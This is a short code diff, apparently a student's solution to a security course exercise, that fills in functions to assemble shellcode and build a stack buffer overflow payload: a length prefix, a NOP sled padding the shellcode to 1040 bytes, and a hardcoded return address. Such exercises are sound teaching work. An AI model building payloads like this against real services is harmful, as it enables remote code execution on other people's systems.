@@ -1,5 +1,6 @@
 import os
 import socket
+import struct 
 
 from infosec.core import assemble
 
@@ -39,8 +40,7 @@ def get_shellcode() -> bytes:
     Returns:
          The bytes of the shellcode.
     """
-    # TODO: IMPLEMENT THIS FUNCTION
-    raise NotImplementedError()
+    return assemble.assemble_file(PATH_TO_SHELLCODE)
 
 
 def get_payload() -> bytes:
@@ -62,8 +62,12 @@ def get_payload() -> bytes:
     Returns:
          The bytes of the payload.
     """
-    # TODO: IMPLEMENT THIS FUNCTION
-    raise NotImplementedError()
+    ra = 0xbfffdd3c
+    message_len = 1040
+    buffuer_len =  1044  
+    shellcode_bytes = get_shellcode()
+    return struct.pack('>i', buffuer_len) + shellcode_bytes.rjust(message_len, b'\x90')+ struct.pack('<I', ra)
+
 
 
 def main():
